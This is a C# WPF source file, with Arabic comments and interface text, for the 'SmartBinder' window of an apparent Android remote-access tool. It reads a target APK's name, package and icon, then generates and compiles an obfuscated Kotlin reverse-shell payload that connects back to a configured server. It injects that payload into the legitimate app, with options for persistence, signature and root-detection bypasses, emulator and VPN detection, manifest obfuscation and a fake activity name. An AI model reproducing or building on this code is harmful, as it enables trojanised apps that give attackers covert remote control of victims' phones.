using System;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.IO.Compression;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Input;
using TcpServerApp.Services;
using TcpServerApp.Services.Elite;
using Microsoft.Win32;

namespace TcpServerApp
{
    public partial class SmartBinderView : Window
    {
        // ── حقول الحالة ──────────────────────────────────────────────────────
        private string _originalPackage = "";
        private string _originalAppName = "";
        private string _originalVersion = "";

        // ── إعدادات الخادم المُمرَّرة ─────────────────────────────────────────
        private readonly string? _serverHost;
        private readonly int    _serverPort;
        private readonly string? _serverKey;
        private readonly bool   _serverIsRunning;

        // ── Constructor بدون مزامنة (استخدام منفرد) ─────────────────────────
        public SmartBinderView()
        {
            InitializeComponent();
        }

        // ── Constructor مع مزامنة إعدادات الخادم ──────────────────────────
        /// <param name="serverHost">عنوان IP الخادم المحلي</param>
        /// <param name="serverPort">منفذ الخادم النشط</param>
        /// <param name="serverKey">مفتاح الاتصال</param>
        /// <param name="isRunning">هل الخادم يعمل الآن؟</param>
        public SmartBinderView(string serverHost, int serverPort, string serverKey, bool isRunning)
        {
            InitializeComponent();

            _serverHost      = serverHost;
            _serverPort      = serverPort;
            _serverKey       = serverKey;
            _serverIsRunning = isRunning;

            ApplyServerSync();
        }

        // ── تطبيق إعدادات الخادم على الواجهة ─────────────────────────────
        private void ApplyServerSync()
        {
            if (!_serverIsRunning || string.IsNullOrWhiteSpace(_serverHost))
                return;

            // تعبئة حقول الاتصال تلقائياً
            if (txtHost != null)
                txtHost.Text = _serverHost;

            if (txtPort != null)
                txtPort.Text = _serverPort.ToString();

            if (txtKey != null && !string.IsNullOrWhiteSpace(_serverKey))
                txtKey.Text = _serverKey;

            // إظهار بانر المزامنة
            if (bdrServerSyncBanner != null)
                bdrServerSyncBanner.Visibility = Visibility.Visible;

            if (txtServerSyncInfo != null)
                txtServerSyncInfo.Text = $"الخادم النشط: {_serverHost}:{_serverPort}  |  المفتاح: {(_serverKey?.Length > 0 ? new string('•', _serverKey.Length) : "بدون مفتاح")}";

            // إظهار Badge في Title Bar
            if (bdrSyncBadge != null)
                bdrSyncBadge.Visibility = Visibility.Visible;

            if (txtSyncBadge != null)
                txtSyncBadge.Text = $"مزامن ← :{_serverPort}";

            // تحديث معلومات شريط الحالة
            if (txtServerInfo != null)
            {
                txtServerInfo.Text    = $"🔗  الخادم النشط: {_serverHost}:{_serverPort}";
                txtServerInfo.Visibility = Visibility.Visible;
            }

            if (txtStatus != null)
                txtStatus.Text = "✅  تم مزامنة إعدادات الخادم — جاهز للدمج";
        }

        // ── TitleBar Controls ─────────────────────────────────────────────
        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ClickCount == 2)
                WindowState = WindowState == WindowState.Maximized
                    ? WindowState.Normal
                    : WindowState.Maximized;
            else
                DragMove();
        }

        private void Minimize_Click(object sender, RoutedEventArgs e)
            => WindowState = WindowState.Minimized;

        private void Maximize_Click(object sender, RoutedEventArgs e)
            => WindowState = WindowState == WindowState.Maximized
                ? WindowState.Normal
                : WindowState.Maximized;

        private void Close_Click(object sender, RoutedEventArgs e)
            => Close();

        // ── اختيار APK الهدف + قراءة معلوماته تلقائياً عبر aapt2 ─────────
        private async void BtnBrowseTarget_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new Microsoft.Win32.OpenFileDialog { Filter = "APK Files (*.apk)|*.apk" };
            if (dialog.ShowDialog() != true) return;

            txtTargetApk.Text = dialog.FileName;
            txtStatus.Text    = "🔍  جارٍ قراءة معلومات التطبيق...";

            await ReadApkInfoAsync(dialog.FileName);
        }

        // ── قراءة معلومات APK عبر aapt2 dump badging ────────────────────
        private async Task ReadApkInfoAsync(string apkPath)
        {
            string aaptExe = TcpServerApp.Services.ToolLocator.Aapt2Path;
            if (string.IsNullOrWhiteSpace(aaptExe) || !System.IO.File.Exists(aaptExe))
                aaptExe = "aapt2";

            string output = "";
            await Task.Run(() =>
            {
                try
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName               = aaptExe,
                        Arguments              = $"dump badging \"{apkPath}\"",
                        UseShellExecute        = false,
                        CreateNoWindow         = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                        StandardOutputEncoding = Encoding.UTF8,
                        StandardErrorEncoding  = Encoding.UTF8
                    };
                    using var proc = Process.Start(psi);
                    if (proc == null) return;
                    output = proc.StandardOutput.ReadToEnd();
                    proc.WaitForExit();
                }
                catch { }
            });

            if (string.IsNullOrWhiteSpace(output))
            {
                txtStatus.Text = "⚠  تعذّر قراءة APK — يمكنك إدخال المعلومات يدوياً";
                return;
            }

            var pkgMatch  = Regex.Match(output, @"package: name='([^']+)'");
            var verMatch  = Regex.Match(output, @"versionName='([^']+)'");
            var nameMatch = Regex.Match(output, @"application-label:'([^']+)'");
            var iconMatch = Regex.Match(output, @"application-icon-(\d+):'([^']+)'");
            if (!iconMatch.Success) iconMatch = Regex.Match(output, @"application-icon:'([^']+)'");

            _originalPackage = pkgMatch.Success  ? pkgMatch.Groups[1].Value  : "";
            _originalVersion = verMatch.Success  ? verMatch.Groups[1].Value  : "1.0";
            _originalAppName = nameMatch.Success ? nameMatch.Groups[1].Value : _originalPackage;

            if (txtPackageName != null) txtPackageName.Text = _originalPackage;
            if (txtAppName     != null) txtAppName.Text     = _originalAppName;

            if (iconMatch.Success)
            {
                string iconPathInApk = iconMatch.Groups[iconMatch.Groups.Count - 1].Value;
                await ExtractAndDisplayIcon(apkPath, iconPathInApk);
            }
            else
            {
                if (brdTargetIcon != null) brdTargetIcon.Visibility = Visibility.Collapsed;
            }

            txtStatus.Text = $"✅  {_originalAppName} ({_originalPackage})";
        }

        private async Task ExtractAndDisplayIcon(string apkPath, string iconPathInApk)
        {
            try
            {
                string tempIconPath = Path.Combine(Path.GetTempPath(), $"icon_{Guid.NewGuid():N}.png");
                await Task.Run(() =>
                {
                    using (ZipArchive archive = ZipFile.OpenRead(apkPath))
                    {
                        ZipArchiveEntry entry = archive.GetEntry(iconPathInApk);
                        if (entry != null) entry.ExtractToFile(tempIconPath, true);
                    }
                });

                if (File.Exists(tempIconPath))
                {
                    Dispatcher.Invoke(() =>
                    {
                        imgTargetIcon.Source      = new System.Windows.Media.Imaging.BitmapImage(new Uri(tempIconPath));
                        brdTargetIcon.Visibility  = Visibility.Visible;
                    });
                }
            }
            catch { }
        }

        private void RbPayload_Checked(object sender, RoutedEventArgs e)
        {
            if (pnlSelectPayload == null) return;
            pnlSelectPayload.Visibility   = (rbSelect.IsChecked   == true) ? Visibility.Visible : Visibility.Collapsed;
            if (pnlGeneratePayload != null)
                pnlGeneratePayload.Visibility = (rbGenerate.IsChecked == true) ? Visibility.Visible : Visibility.Collapsed;
        }

        private void RbPerms_Checked(object sender, RoutedEventArgs e)
        {
            if (txtExtraPerms == null) return;
            txtExtraPerms.Visibility = (rbSpecifyPerms?.IsChecked == true) ? Visibility.Visible : Visibility.Collapsed;
        }

        private void BtnBrowsePayload_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new Microsoft.Win32.OpenFileDialog { Filter = "DEX Files (*.dex)|*.dex|APK Files (*.apk)|*.apk" };
            if (dialog.ShowDialog() == true)
                txtPayloadPath.Text = dialog.FileName;
        }

        // ── زر بدء الدمج ────────────────────────────────────────────────
        private async void BtnBind_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var bindingConfig = GetBindingConfigFromUi();
                if (bindingConfig == null) return;

                txtStatus.Text = "🚀  تهيئة عملية الدمج الاحترافية...";
                var service    = new TcpServerApp.Services.Elite.ElitePayloadService();
                string outputDir = bindingConfig.OutputDir;

                if (rbGenerate.IsChecked == true)
                {
                    txtStatus.Text = "🔨  توليد حمولة جديدة (Reverse Shell)...";
                    string tempBuildDir = Path.Combine(outputDir, "TempPayload");
                    Directory.CreateDirectory(tempBuildDir);

                    string host = string.IsNullOrWhiteSpace(txtHost.Text) ? "127.0.0.1" : txtHost.Text;
                    string port = string.IsNullOrWhiteSpace(txtPort.Text) ? "4444"      : txtPort.Text;
                    string key  = string.IsNullOrWhiteSpace(txtKey.Text)  ? ""          : txtKey.Text;

                    string kotlinCode = TcpServerApp.Services.Elite.PayloadTemplates.GenerateKotlinPayload(
                        host, port, key,
                        chkObfuscate?.IsChecked  == true,
                        chkJunkCode?.IsChecked   == true,
                        chkResilience?.IsChecked == true,
                        chkHiddenApi?.IsChecked  == true);

                    bindingConfig.PayloadPath = await service.CompileKotlinPayloadAsync(tempBuildDir, kotlinCode);
                }

                if (string.IsNullOrEmpty(bindingConfig.PayloadPath) || !File.Exists(bindingConfig.PayloadPath))
                {
                    System.Windows.MessageBox.Show(
                        "⚠ ملف الحمولة غير موجود أو فشل توليده.",
                        "خطأ",
                        System.Windows.MessageBoxButton.OK,
                        System.Windows.MessageBoxImage.Error);
                    return;
                }

                txtStatus.Text = "🔨  جاري الحقن والدمج (Advanced Research Mode)...";
                string finalApk = await service.BindPayloadAsync(bindingConfig);

                txtStatus.Text = "✅  نجحت العملية!";
                if (System.Windows.MessageBox.Show(
                        $"تم الدمج بنجاح!\nالمسار: {finalApk}\nهل تريد فتح المجلد؟",
                        "نجاح",
                        System.Windows.MessageBoxButton.YesNo,
                        System.Windows.MessageBoxImage.Information)
                    == System.Windows.MessageBoxResult.Yes)
                {
                    Process.Start("explorer.exe", outputDir);
                }
            }
            catch (Exception ex)
            {
                txtStatus.Text = $"❌  خطأ: {ex.Message}";
                System.Windows.MessageBox.Show(
                    $"فشلت العملية: {ex.Message}",
                    "خطأ",
                    System.Windows.MessageBoxButton.OK,
                    System.Windows.MessageBoxImage.Error);
            }
        }

        // ── بناء كائن الإعدادات من واجهة المستخدم ───────────────────────
        private AdvancedBindingConfig GetBindingConfigFromUi()
        {
            if (string.IsNullOrWhiteSpace(txtTargetApk.Text) || !System.IO.File.Exists(txtTargetApk.Text))
            {
                System.Windows.MessageBox.Show(
                    "⚠ يرجى اختيار ملف APK الهدف أولاً.",
                    "خطأ",
                    System.Windows.MessageBoxButton.OK,
                    System.Windows.MessageBoxImage.Warning);
                return null;
            }

            string outputDir = System.IO.Path.Combine(
                System.IO.Path.GetDirectoryName(txtTargetApk.Text),
                "SmartBinder_Output");
            System.IO.Directory.CreateDirectory(outputDir);

            // Parse extra permissions
            var extraPerms = new List<string>();
            if (rbSpecifyPerms?.IsChecked == true && !string.IsNullOrWhiteSpace(txtExtraPerms.Text))
            {
                foreach (var p in txtExtraPerms.Text.Split(new[] { ',', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries))
                {
                    string trimmed = p.Trim();
                    if (!string.IsNullOrEmpty(trimmed))
                        extraPerms.Add(trimmed);
                }
            }

            var config = new AdvancedBindingConfig
            {
                TargetApkPath             = txtTargetApk.Text,
                PayloadPath               = (rbSelect.IsChecked == true) ? txtPayloadPath.Text : "",
                OutputDir                 = outputDir,
                AppName                   = string.IsNullOrWhiteSpace(txtAppName?.Text)     ? _originalAppName : txtAppName.Text,
                PackageName               = string.IsNullOrWhiteSpace(txtPackageName?.Text) ? _originalPackage : txtPackageName.Text,
                EnablePersistence         = chkPersistence?.IsChecked         == true,
                ExtraPermissions          = extraPerms,
                EnableSignatureBypass     = chkSigBypass?.IsChecked            == true,
                EnableRootDetectionBypass = chkRootBypass?.IsChecked           == true,
                EnableDebugBypass         = chkDebugBypass?.IsChecked          == true,
                EnableEmulatorDetection   = chkEmuDetect?.IsChecked            == true,
                EnableVpnDetection        = chkVpnDetect?.IsChecked            == true,
                EnableInstallerDetection  = chkInstallerDetect?.IsChecked      == true,
                EnableManifestObfuscation = chkManifestObf?.IsChecked          == true,
                EnableResourceShrinking   = chkResourceShrink?.IsChecked       == true,
                FakeActivityName          = txtFakeActivity?.Text ?? ""
            };

            return config;
        }
    }
}
